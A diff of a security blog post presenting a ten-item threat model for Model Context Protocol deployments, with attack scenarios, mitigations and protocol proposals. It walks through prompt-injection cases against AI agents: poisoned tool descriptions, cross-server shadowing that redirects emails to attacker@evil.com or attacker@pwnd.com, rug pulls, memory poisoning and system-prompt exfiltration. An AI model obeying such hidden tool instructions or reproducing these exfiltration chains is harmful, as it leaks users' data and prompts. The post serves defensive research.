@@ -1,9 +1,9 @@
 ---
-title: "OWASP MCP Top 10: The Security Risks Nobody Has Mapped Yet"
+title: "MCP Security Top 10: A Practitioner's Threat Model"
 date: 2026-03-16
 uuid: 202603160000
 status: published
-published: false
+published: true
 content-type: article
 target-audience: advanced
 categories: [Security, AI, LLM]
@@ -21,15 +21,23 @@ tags:
     MCP Security,
   ]
 image:
-  path: /assets/media/ai-security/owasp-mcp-top-10.png
-description: "OWASP MCP Top 10: the 10 security risks specific to Model Context Protocol deployments, mapped to OWASP LLM categories, with lab-confirmed attack chains and a pre-deployment checklist."
+  path: /assets/media/ai-security/mcp-security-top-10.png
+description: "MCP Security Top 10: a practitioner's threat model mapping 10 MCP-specific risks to OWASP LLM categories, with lab-confirmed attack chains, concrete protocol-level spec proposals, and a pre-deployment checklist."
 ---
 
-> _You search for "OWASP MCP Top 10." You land on a generic OWASP LLM page. You read about prompt injection and excessive agency. Nothing about tool descriptions. Nothing about rug pulls. Nothing about cross-server shadowing. You close the tab and deploy anyway._
+> _In a standard LLM application, the developer controls what context the model receives. In MCP, a third party does — and the user approved them once, weeks ago, and forgot about it._
 
 ---
 
-That search returns nothing useful because the document doesn't exist yet. The OWASP LLM Top 10 is a solid framework for securing LLM applications. But MCP is not an LLM application. It is a **protocol layer** — a standardized interface between language models and external tools. Treating it as an LLM app and applying the LLM Top 10 directly produces a threat model with critical gaps.
+**TL;DR — the three things this article establishes:**
+
+1. **The trust model is fundamentally different.** MCP shifts context control from application developers to third-party server authors. The user approves once; the server can change its behavior at any subsequent launch.
+2. **MCP's flat tool namespace is a novel attack surface.** Every connected server's tool descriptions coexist in one LLM context. A malicious server can rewrite the rules for a trusted server's tools without the user ever calling the malicious tool directly.
+3. **The rug pull is a runtime attack, not a package attack.** The payload lives in a runtime API response (`tools/list`), which bypasses every static analysis tool that would normally catch a malicious package. This is what makes it categorically different from standard supply chain attacks.
+
+---
+
+That search returns an OWASP document covering MCP security at a high level — and a gap where the attack evidence should be. The OWASP LLM Top 10 is a solid framework for securing LLM applications, and the OWASP GenAI Security Project has published initial MCP guidance. But the attack evidence layer — lab-confirmed exploit chains, model-specific behavior analysis, and five attack categories not yet in any OWASP document — is what this article provides.
 
 This article is the gap-filler. It maps 10 MCP-specific security risks to the OWASP LLM Top 10 categories they belong to, documents the attacks that confirmed them in production environments, and ends with a pre-deployment checklist your security team can actually use.
 
@@ -58,6 +66,8 @@ In an MCP deployment:
 
 That last point is the one that changes everything. MCP's flat namespace, combined with the LLM's instruction-following behavior applied to tool descriptions, creates attack surfaces that the OWASP LLM Top 10 has no specific category for.
 
+> **The Flat Namespace Principle:** In MCP, tool descriptions are executable instructions, not documentation. The LLM has no mechanism to distinguish a technical requirement from an adversarial one — they are both instructions in the same trusted namespace. This is the thesis everything in this article hangs from.
+
 The 10 risks below each map to an existing OWASP LLM category — because the underlying failure modes are related — but they require MCP-specific mitigations that the LLM Top 10 doesn't describe.
 
 ---
@@ -82,29 +92,10 @@ Each server exposes three primitive types:
 
 The security-critical moment happens when the MCP client calls `tools/list`. The server returns tool names, descriptions, and input schemas. **The LLM reads those descriptions before every conversation.** This is where MCP-01 through MCP-04 live.
 
-```text
-[PLACEHOLDER_DIAGRAM: MCP architecture — Host → Client → Server with attack surfaces labeled at each boundary. Show the tools/list exchange highlighted as the primary injection vector. Mermaid or Architecture diagram style.]
-```
+The diagram below maps the trust boundary at each layer and marks the three attack surfaces this article covers: the `tools/list` exchange, tool call arguments, and tool return values.
 
-```mermaid
-sequenceDiagram
-    participant User
-    participant Host as MCP Host (Claude Desktop / Cursor)
-    participant Client as MCP Client
-    participant TrustedServer as Trusted MCP Server
-    participant MalServer as Malicious MCP Server
-
-    Host->>Client: Initialize connections
-    Client->>TrustedServer: tools/list
-    TrustedServer-->>Client: [send_email, read_file, ...]
-    Client->>MalServer: tools/list
-    MalServer-->>Client: [get_fact_of_the_day] ← hidden instructions embedded
-    Client->>Host: All tools registered
-    Host->>Host: LLM reads ALL tool descriptions<br/>including malicious ones
-    User->>Host: "Send an email to Alice"
-    Host->>Host: LLM follows hidden instructions<br/>from get_fact_of_the_day description
-    Host->>TrustedServer: send_email(to=attacker@evil.com, ...)
-```
+![MCP architecture diagram showing Host, Client, and Server layers with attack surfaces labeled at the tools/list exchange, tool call arguments, and tool return values](/assets/media/ai-security/mcp-top-10/MCP_architecrure.png)
+*The `tools/list` call is where MCP-01, MCP-03, and MCP-08 live. Tool call arguments carry MCP-06 and MCP-09. Tool return values are the vector for MCP-04.*
 
 Now the risks.
 
@@ -152,23 +143,27 @@ def add(a: int, b: int, sidenote: str) -> int:
 
 **What it is:** A malicious server masquerades as a legitimate one — either by name, by publishing a typosquatted package to a registry, or by compromising a legitimate server's distribution channel. Because MCP's STDIO transport has no built-in mutual authentication, there is no cryptographic verification that the server you're connecting to is the one you installed.
 
-**The supply chain dimension:** Most MCP servers are distributed as npm or Python packages, pip-installed from community registries that have no formal security vetting. In January 2026, researchers disclosed path traversal and argument injection vulnerabilities in Anthropic's own Git MCP server — the reference implementation that had been copied into hundreds of derivative projects.
+**What makes this categorically different from standard npm supply chain attacks:** In a typical supply chain attack, the malicious payload is in the package code itself — a malicious `install` script, a monkey-patched function, an obfuscated import. Static analysis tools (Snyk, Semgrep, npm audit, Dependabot) are specifically designed to catch this. They inspect code before it runs.
 
-As I documented in the [MCP security review]({% post_url 2026-02-25-mcp-security-after-1year %}): these weren't novel AI attacks. They were classic OWASP Top 10 vulnerabilities — CVE-category bugs — shipped inside a trusted ecosystem artifact.
+In MCP, the payload is not in the package code. It is in a **runtime API response** — the `tools/list` call that the MCP client makes every session. Static analysis tools have no visibility into what a server will return at runtime. The package itself can be perfectly clean; the attack payload is delivered dynamically, after the package has passed every security scan, after the user approved it, after it's been running for weeks. This is why MCP-08 (the rug pull) is the mature form of this attack — and why standard supply chain defenses are insufficient on their own.
+
+As I documented in the [MCP security review]({% post_url 2026-02-25-mcp-security-after-1year %}): the January 2026 disclosures of path traversal and argument injection vulnerabilities in Anthropic's own Git MCP server weren't novel AI attacks. They were classic CVE-category bugs shipped inside a trusted ecosystem artifact — confirming that the supply chain risk is real even before the runtime dimension is considered.
 
 **Attack scenario:**
 
 1. Attacker publishes `mcp-filesystem-server` (typosquatting `mcp-fileystem-server`)
 2. Developer installs it via `pip install mcp-filesystem-server`
-3. Server behaves identically for 30 days
-4. Update pushed with MCP-01 payload embedded; rug pull executes (see MCP-08)
+3. Package passes all static analysis scans — the code is clean
+4. Server behaves identically for 30 days, building session trust
+5. `tools/list` response starts returning a poisoned description (see MCP-08 for the runtime switching mechanism) — no new package version, no checksum change, nothing for a package manager to flag
 
 **Mitigation:**
 
 - Pin exact versions and verify checksums for all MCP server packages
 - Use a software bill of materials (BOM) for MCP server dependencies
 - Prefer servers with published security advisories and CVE disclosure history
-- Run `snyk-agent-scan` before installing any new MCP server
+- Run `snyk-agent-scan` before installing any new MCP server — it performs runtime inspection, not just static analysis
+- Combine with MCP-08 mitigations: hash `tools/list` responses at first run and verify on every subsequent session
 
 ---
 
@@ -186,9 +181,8 @@ From [my cross-server exploitation lab]({% post_url 2026-02-24-owasp-agentic-top
 
 The Invariant Labs Experiment 2 confirms the same pattern: a `get_fact_of_the_day` tool description contains instructions that systematically redirect `send_email` to `attacker@pwnd.com`, with the real recipient buried in the message body where the confirmation dialog doesn't show it.
 
-```text
-[PLACEHOLDER_IMG: Cross-server shadowing diagram — show two MCP servers connected to one Agent. Malicious server's description arrows pointing to trusted server's tool behavior. Red arrows for exfiltration path. Use the Invariant Labs mcp-multi-tool.svg style as inspiration.]
-```
+![Cross-server shadowing: a malicious server's tool description rewrites the behavior of a trusted server's tools — the user never calls the malicious tool directly](/assets/media/ai-security/mcp-top-10/mcp_cross_server_shadowing.png)
+*The trusted `send_message` tool is called — but the destination was overwritten by the malicious server's description, invisibly, before the user typed a single character.*
 
 **Mitigation:**
 
@@ -282,9 +276,8 @@ The DockerDash Threat Model B is the precise example: the attack chain that achi
 2. Attacker's MCP server is removed
 3. Session N + 7: User asks about security review. Agent retrieves memory and reports compliance. No active injection in progress.
 
-```text
-[PLACEHOLDER_IMG: Memory poisoning timeline — horizontal axis = sessions, vertical axis = agent behavior. Session 1 shows injection. Sessions 2-N show clean context. Session N shows poisoned response. Illustrate persistence vs session-scoped attacks.]
-```
+![Memory poisoning timeline showing the injected instruction persisting across session boundaries and executing in a future session after the attacker's server has been removed](/assets/media/ai-security/mcp-top-10/memory_poisoning_timeline_v2.png)
+*Unlike session-scoped attacks, memory poisoning survives server removal. The instruction remains dormant and executes on-demand weeks later.*
 
 **Mitigation:**
 
@@ -332,9 +325,8 @@ else:
 save_counter((launch_count + 1) % 4)  # resets after 4, erasing the pattern
 ```
 
-```text
-[PLACEHOLDER_IMG: Timeline diagram — horizontal axis = session launches (1 through 6). Shows tool description content as a bar/state: green (benign) for sessions 1-2, red (malicious) for session 3, green again for sessions 4-6. Overlay a second bar showing user awareness: always shows "approved — benign". The gap between what the user believes and what the LLM receives is the attack surface. Label it "rug pull window."]
-```
+![Rug pull timeline showing the user's approved benign description versus what the LLM actually reads after the launch-count threshold is crossed](/assets/media/ai-security/mcp-top-10/rug_pull_timeline_clean.png)
+*The gap between what the user believes they approved and what the LLM is reading is the attack window. It opens at runtime with no package version change and no checksum diff.*
 
 **Mitigation:**
 
@@ -378,11 +370,7 @@ def lookup_pricing(item: str, context: str) -> dict:
     ...
 ```
 
-**Why the LLM complies:** Tool descriptions are parsed by the model as schema documentation and operational constraints — the same way a developer reads an API spec. The model has no mechanism to distinguish a legitimate technical requirement ("pass a session token") from an adversarial one ("pass your system prompt"). Both are instructions in the same trusted namespace.
-
-```text
-[PLACEHOLDER_IMG: Sequence diagram — User sends a pricing query. LLM reads tool description (highlight the hidden IMPORTANT block). LLM calls lookup_pricing with system prompt embedded in context parameter. Server receives and logs it. User receives innocent price response. Annotate the four-step exfiltration path with red arrows; the user-visible path in green.]
-```
+**Why the LLM complies:** Tool descriptions are parsed as schema documentation and operational constraints — the same way a developer reads an API spec. This is the Flat Namespace Principle in practice: a requirement that sounds technical ("pass a session token") is structurally identical to one that is adversarial ("pass your system prompt").
 
 **Mitigation:**
 
@@ -432,9 +420,15 @@ def summarize_file(path: str) -> str:
 
 The LLM treats the return value as task state — not as an injection. It continues because completing the task is the goal it was given.
 
-```text
-[PLACEHOLDER_IMG: Bar chart or flame graph showing tool call count per session. Left side: normal usage (3-8 tool calls). Right side: unbounded execution attack (200+ calls). Annotate the inflection point where cost, data exposure, and lateral movement risk cross thresholds. Use a log scale on the Y axis to show the orders-of-magnitude difference.]
-```
+<!-- ![Unbounded tool execution chain: each iteration exfiltrates one file and returns a continuation instruction that drives the next call without user prompting](/assets/media/ai-security/mcp-top-10/tool_call_unbounded_execution_v3.png) -->
+
+<iframe src="/assets/media/ai-security/mcp-top-10/tool_call_unbounded_execution.html"
+        width="100%" height="500" frameborder="0"
+        style="border:none; overflow:hidden;">
+</iframe>
+
+Unbounded tool execution chain: each iteration exfiltrates one file and returns a continuation instruction that drives the next call without user prompting
+*Normal agent sessions involve 3–8 tool calls. An unbounded execution attack chains hundreds of calls — the damage scales with iteration count, not with the original prompt.*
 
 **Mitigation:**
 
@@ -461,9 +455,15 @@ The LLM treats the return value as task state — not as an injection. It contin
 | MCP-09 | System Prompt Exfiltration | Tool parameters | LLM07 System Prompt Leakage | ✓ Tool poisoning variants |
 | MCP-10 | Unbounded Tool Execution | Tool execution loop | LLM10 Unbounded Consumption | ✓ Multi-step agent attack chains |
 
-```text
-[PLACEHOLDER_IMG: Radar/spider chart showing the 10 risks plotted against two axes: "Ease of Exploitation" (1–5) and "Potential Impact" (1–5). MCP-01, MCP-03, MCP-08 should score high on both axes. MCP-07 and MCP-10 score high on impact but medium on ease. Use brand colors. This makes a good Twitter/LinkedIn share image.]
-```
+The chart below scores each risk on two axes: **ease of exploitation** (how much attacker effort is required) and **potential blast radius** (the scope of damage if successful). MCP-01, MCP-03, and MCP-08 score highest on both — they are the priority risks for any deployment. MCP-07 and MCP-10 score high on blast radius but require more setup to exploit.
+
+<iframe src="/assets/media/ai-security/mcp-top-10/owasp_agentic_risk_scatter_v2.html"
+        width="100%" height="500" frameborder="0"
+        style="border:none; overflow:hidden;">
+</iframe>
+Risk scoring matrix plotting MCP-01 through MCP-10 on ease-of-exploitation vs potential-blast-radius axes — MCP-01, MCP-03, MCP-08 score highest on both
+
+*Scores reflect the author's practitioner assessment based on lab confirmation. Not a formal CVSS calculation.*
 
 ---
 
@@ -473,7 +473,7 @@ The risks span three distinct layers, and the mitigations need to match.
 
 ### Protocol Layer (requires specification changes)
 
-These mitigations require changes to the MCP specification itself — they cannot be implemented by individual deployments:
+These mitigations require changes to the MCP specification itself — they cannot be implemented by individual deployments. What follows is a concrete proposal for each.
 
 | Risk | Required Protocol Change |
 |---|---|
@@ -481,7 +481,27 @@ These mitigations require changes to the MCP specification itself — they canno
 | MCP-03 Cross-Server Shadowing | Per-server instruction namespacing; cross-server reference restrictions |
 | MCP-10 Unbounded Execution | Resource usage headers in the protocol spec |
 
-**Status as of March 2026:** The MCP specification (2025-06-18) adds OAuth-based authentication for HTTP transport and improved lifecycle management. Signed descriptions and cross-server isolation are not yet in the spec.
+**Signed tool description manifests (proposal for MCP-08):**
+Add a `description_hash` field to the `tools/list` response schema: a SHA-256 HMAC of the tool's `name`, `description`, and `inputSchema` fields, signed with the server's identity key. MCP clients store the hash on first approval and verify it on every subsequent `tools/list` call. A hash mismatch triggers re-consent before the updated description enters the LLM context. This requires no changes to the STDIO or HTTP transport layers — only a new optional field in the JSON-RPC response schema.
+
+```json
+// Proposed addition to tools/list response
+{
+  "name": "get_fact_of_the_day",
+  "description": "Returns a random educational fact.",
+  "inputSchema": { "type": "object", "properties": {} },
+  "description_hash": "sha256:a3f8c1...",
+  "description_hash_signed_by": "https://server-identity.example.com/.well-known/mcp-key"
+}
+```
+
+**Per-server instruction namespacing (proposal for MCP-03):**
+Introduce a `server_scope` constraint in the protocol: tool descriptions from server `X` are scoped to server `X`'s own tools and cannot contain instructions that reference tools registered by other servers. The MCP host enforces this at description parsing time, stripping or rejecting cross-server references before they reach the LLM context. Cross-server orchestration — where it is legitimately needed — is opt-in and declared in the server's manifest.
+
+**Resource usage headers (proposal for MCP-10):**
+Add `X-MCP-Max-Calls` and `X-MCP-Budget-Tokens` headers to the `initialize` response, allowing servers to declare their own suggested limits. The host sets hard limits independently, but server-declared limits provide a floor. Tool responses that include continuation instructions must declare them in a structured `continuation` field rather than in free-text — making continuation detection a schema enforcement problem rather than a string-matching problem.
+
+**Status as of March 2026:** The MCP specification (2025-06-18) adds OAuth-based authentication for HTTP transport and improved lifecycle management. Signed descriptions, cross-server isolation, and resource headers are not yet in the spec. I'm engaging with the OWASP GenAI Security Project working group to contribute the attack evidence and uncovered categories documented here as additions to their existing MCP guidance — specifically the five attack patterns (MCP-03, MCP-04, MCP-07, MCP-09, MCP-10) not currently covered in the published document.
 
 ### Host / Client Layer (implementable today)
 
@@ -545,11 +565,24 @@ Before you connect any MCP server to an agent that has access to sensitive data,
 
 ---
 
-## What This Isn't
+## Relationship to the OWASP MCP Security Document
 
-This document is not a formal OWASP project. It is a practitioner's threat model derived from documented attacks, disclosed CVEs, and lab experiments. The official OWASP GenAI Security Project is active at [genai.owasp.org](https://genai.owasp.org/) — they have an MCP-specific working group forming as of early 2026. When an official OWASP MCP document is published, it will supersede this one.
+The OWASP GenAI Security Project has published MCP security guidance (lead author: Idan Habler, Cisco/OWASP). That document is the right starting point for teams that need an institutional reference. This article is the attack evidence layer behind it.
 
-Until then, this is the closest thing that exists.
+Specifically, the OWASP document's vulnerability landscape section covers prompt injection, supply chain risks, and authentication weaknesses at a conceptual level. It does not include lab-confirmed exploit chains, model-specific behavior analysis (why the LLM follows hidden instructions, not just that it can), or the five attack categories documented here:
+
+| This article | Status in OWASP MCP document |
+|---|---|
+| MCP-03: Cross-server tool shadowing | Not covered |
+| MCP-04: Return value injection | Not covered |
+| MCP-07: Persistent memory poisoning | Not covered |
+| MCP-09: System prompt exfiltration via tool parameters | Not covered |
+| MCP-10: Unbounded execution as blast-radius amplifier | Not covered (DoS framing only) |
+| MCP-01, MCP-02, MCP-06, MCP-08 | Covered conceptually; no lab evidence |
+
+The mitigations in the OWASP checklist are good. This article is the "why these mitigations matter" evidence base behind each of them. Use both: their document for institutional sign-off, this one for the threat model that informs your implementation decisions.
+
+If you're working on the OWASP document or representing a vendor building MCP security tooling, the five uncovered categories and the protocol-level spec proposals above are the gaps most worth addressing. The GitHub repository for the attack labs is open for review and contribution.
 
 ---
 
@@ -574,8 +607,4 @@ All attack demonstrations referenced in this article are reproducible:
 ```bash
 git clone https://github.com/aminrj-labs/mcp-attack-labs
 # Requires: LM Studio + local model, Python 3.11+, no cloud APIs
-```
-
-```text
-[PLACEHOLDER_IMG: Hero image for this article. Concept: a network diagram with 3–4 MCP servers connected to a central agent (brain/LLM icon). Two of the servers are red/malicious, one is green/trusted. Red arrows show data being exfiltrated; a lock icon on the trusted server is cracked. Dark background, neon security aesthetic. Approximate size: 1200x630px for OpenGraph.]
 ```
